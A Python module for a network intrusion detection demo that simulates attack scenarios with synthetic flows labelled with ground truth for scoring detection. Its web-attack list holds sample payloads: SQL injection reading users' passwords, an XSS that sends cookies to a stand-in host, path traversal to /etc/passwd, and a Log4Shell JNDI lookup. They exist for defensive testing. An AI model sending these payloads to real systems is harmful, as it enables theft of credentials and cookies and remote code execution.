"""
Attack simulator: feeds the *same* detection pipeline that live capture uses, with
synthetic flows generated by traffic.py, so the whole IDS can be demonstrated on any
machine without needing a real attack or any special privileges.

Every simulated flow carries a hidden ground-truth label so the dashboard can report a
live detection rate and false-positive rate.
"""
import threading
import time
import numpy as np

from .traffic import generate

ASSETS = [
    {"id": "gw", "name": "Gateway", "ip": "10.0.0.1", "type": "gateway"},
    {"id": "web", "name": "Web server", "ip": "10.0.2.10", "type": "server"},
    {"id": "db", "name": "Database", "ip": "10.0.2.20", "type": "server"},
    {"id": "mail", "name": "Mail server", "ip": "10.0.2.25", "type": "server"},
    {"id": "ssh", "name": "Bastion host", "ip": "10.0.2.30", "type": "server"},
    {"id": "file", "name": "File server", "ip": "10.0.2.40", "type": "server"},
    {"id": "dns", "name": "DNS server", "ip": "10.0.2.53", "type": "server"},
    {"id": "ws", "name": "Workstations", "ip": "10.0.1.0/24", "type": "clients"},
]
IP = {a["id"]: a["ip"] for a in ASSETS}
SERVERS = [IP[k] for k in ("web", "db", "mail", "ssh", "file", "dns")]

SCENARIOS = {
    "dos": dict(label="DoS/DDoS", title="DDoS flood", target="Web server",
                desc="Dozens of sources hammer the web server with SYN floods, HTTP floods and slowloris connections.",
                rates=[10, 25, 60, 120, 220]),
    "portscan": dict(label="Port Scan", title="Port scan", target="Random server",
                     desc="One attacker sweeps thousands of ports with SYN, connect and XMAS probes.",
                     rates=[8, 18, 40, 80, 150]),
    "bruteforce": dict(label="Brute Force", title="Credential brute force", target="SSH / FTP / RDP / web login",
                       desc="Rapid repeated login attempts against remote-access services.",
                       rates=[4, 10, 20, 40, 80]),
    "webattack": dict(label="Web Attack", title="Web application attack", target="Web server",
                      desc="SQL injection, XSS and traversal payloads, plus scanner probing. The payload is confirmed by the signature engine.",
                      rates=[3, 8, 16, 30, 60]),
    "botnet": dict(label="Botnet C2", title="Botnet beaconing", target="Infected workstation",
                   desc="A compromised workstation phones home to a command-and-control server at machine-regular intervals.",
                   rates=[2, 4, 8, 14, 24]),
    "exfil": dict(label="Data Exfiltration", title="Data exfiltration", target="Database / file server",
                  desc="A server pushes gigabytes outbound over HTTPS, SSH or DNS tunnelling.",
                  rates=[2, 4, 8, 14, 24]),
    "infiltration": dict(label="Infiltration", title="Lateral movement", target="Internal servers",
                         desc="A compromised workstation pivots over SMB, RDP and WinRM into the server network.",
                         rates=[3, 6, 12, 22, 40]),
    "zeroday": dict(label="Zero-Day Anomaly", title="Zero-day exploit", target="Random server",
                    desc="Behaviour the classifier was never trained on. Only the autoencoder recognises it as abnormal.",
                    rates=[2, 4, 8, 14, 24]),
}

ATTACKER_POOL = [f"203.0.113.{i}" for i in range(2, 254)] + [f"198.51.100.{i}" for i in range(2, 254)]
BENIGN_EXT = [f"192.0.2.{i}" for i in range(1, 255)]
WORKSTATIONS = [f"10.0.1.{i}" for i in range(11, 61)]

WEB_PAYLOADS = [
    "GET /products.php?id=1' OR '1'='1 HTTP/1.1\nHost: shop.example.com",
    "GET /search?q=1' UNION SELECT username,password,3 FROM users-- HTTP/1.1\nHost: shop.example.com",
    "POST /comment HTTP/1.1\n\nbody=<script>document.location='http://198.51.100.5/?c='+document.cookie</script>",
    "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: files.example.com",
    "GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1",
    "GET /api/items?id=1;SELECT pg_sleep(5)-- HTTP/1.1\nHost: api.example.com",
    "GET /wp-login.php HTTP/1.1\nUser-Agent: sqlmap/1.7.2#stable",
    "GET / HTTP/1.1\nHost: api.example.com\nUser-Agent: ${jndi:ldap://203.0.113.77:1389/x}",
]


def _port(rng):
    return int(rng.integers(32768, 61000))


class Simulator(threading.Thread):
    def __init__(self, engine):
        super().__init__(daemon=True)
        self.e = engine
        self.rng = np.random.default_rng()
        self.active = {}
        self.lock = threading.Lock()

    # ------------------------------------------------------------ scenario control
    def start_scenario(self, key, intensity=3, duration=30):
        if key not in SCENARIOS:
            raise KeyError(key)
        intensity = int(min(5, max(1, intensity)))
        duration = float(min(300, max(5, duration)))
        r = self.rng
        pick = lambda pool, k=1: [str(x) for x in r.choice(pool, k, replace=False)]
        ctx = {}
        if key == "dos":
            ctx["srcs"] = pick(ATTACKER_POOL, [3, 8, 15, 30, 60][intensity - 1])
            ctx["dst"] = IP["web"]
        elif key == "portscan":
            ctx["srcs"], ctx["dst"] = pick(ATTACKER_POOL), str(r.choice(SERVERS))
        elif key == "bruteforce":
            ctx["srcs"], ctx["rdp"] = pick(ATTACKER_POOL, 2), str(r.choice(WORKSTATIONS))
        elif key == "webattack":
            ctx["srcs"], ctx["dst"] = pick(ATTACKER_POOL, 2), IP["web"]
        elif key == "botnet":
            ctx["srcs"], ctx["dst"] = pick(WORKSTATIONS), pick(ATTACKER_POOL)[0]
        elif key == "exfil":
            ctx["srcs"], ctx["dst"] = [str(r.choice([IP["db"], IP["file"]]))], pick(ATTACKER_POOL)[0]
        elif key == "infiltration":
            ctx["srcs"] = pick(WORKSTATIONS)
        elif key == "zeroday":
            ctx["srcs"], ctx["dst"] = pick(ATTACKER_POOL), str(r.choice(SERVERS))
        with self.lock:
            self.active[key] = {"intensity": intensity, "ends": time.time() + duration, "started": time.time(),
                                "duration": duration, "ctx": ctx}
        self.e.publish("sim", self.state())

    def stop_scenario(self, key=None):
        with self.lock:
            if key is None:
                self.active.clear()
            else:
                self.active.pop(key, None)
        self.e.publish("sim", self.state())

    def state(self):
        now = time.time()
        with self.lock:
            return [{"key": k, "intensity": v["intensity"], "remaining": max(0, v["ends"] - now),
                     "duration": v["duration"]} for k, v in self.active.items()]

    # ---------------------------------------------------------------- endpoints
    def _benign_meta(self, X):
        r, meta = self.rng, []
        for row in X:
            port = int(row[0])
            ws = str(r.choice(WORKSTATIONS))
            if port == 53:
                src, dst = ws, IP["dns"]
            elif port in (22, 23, 3389, 5900):
                src, dst = ws, IP["ssh"] if port == 22 else str(r.choice(WORKSTATIONS))
            elif port in (25, 993, 143, 110):
                src, dst = ws, IP["mail"]
            elif port == 3306:
                src, dst = IP["web"], IP["db"]
            elif port in (80, 443, 8080, 8443) and r.random() < 0.4:
                src, dst = str(r.choice(BENIGN_EXT)), IP["web"]
            else:
                src, dst = ws, str(r.choice(BENIGN_EXT))
            meta.append({"src": src, "dst": dst, "sport": _port(r), "proto": "UDP" if row[27] < 0 else "TCP",
                         "source": "sim", "truth": "Benign"})
        return meta

    def _attack_meta(self, key, ctx, X):
        r, meta = self.rng, []
        label = SCENARIOS[key]["label"]
        for row in X:
            port = int(row[0])
            src = str(r.choice(ctx["srcs"]))
            if key == "bruteforce":
                dst = {22: IP["ssh"], 21: IP["file"], 3389: ctx["rdp"]}.get(port, IP["web"])
            elif key == "infiltration":
                dst = (IP["file"] if port in (445, 139, 135) else IP["ssh"] if port == 22
                       else str(r.choice(SERVERS)))
            else:
                dst = ctx["dst"]
            m = {"src": src, "dst": dst, "sport": _port(r), "proto": "UDP" if row[27] < 0 else "TCP",
                 "source": "sim", "truth": label}
            if key == "webattack":
                m["payload"] = WEB_PAYLOADS[int(r.integers(len(WEB_PAYLOADS)))]
            meta.append(m)
        return meta

    # --------------------------------------------------------------------- loop
    def run(self):
        last = time.time()
        while True:
            time.sleep(0.25)
            now = time.time()
            dt, last = now - last, now
            expired = []
            with self.lock:
                for k, v in list(self.active.items()):
                    if now > v["ends"]:
                        expired.append(k)
                        del self.active[k]
                snapshot = list(self.active.items())
            if expired:
                self.e.publish("sim", self.state())
            if self.e.settings["sim_paused"]:
                continue
            Xs, metas = [], []
            nb = int(self.rng.poisson(self.e.settings["baseline_rate"] * dt))
            if nb:
                X = generate("Benign", nb, self.rng)
                Xs.append(X); metas += self._benign_meta(X)
            for key, v in snapshot:
                n = int(self.rng.poisson(SCENARIOS[key]["rates"][v["intensity"] - 1] * dt))
                if n:
                    X = generate(SCENARIOS[key]["label"], n, self.rng)
                    Xs.append(X); metas += self._attack_meta(key, v["ctx"], X)
            if Xs:
                order = self.rng.permutation(len(metas))
                X = np.vstack(Xs)[order]
                metas = [metas[i] for i in order]
                try:
                    self.e.process(X, metas)
                except Exception as ex:   # never let the demo thread die
                    print("[simulator] error:", ex)
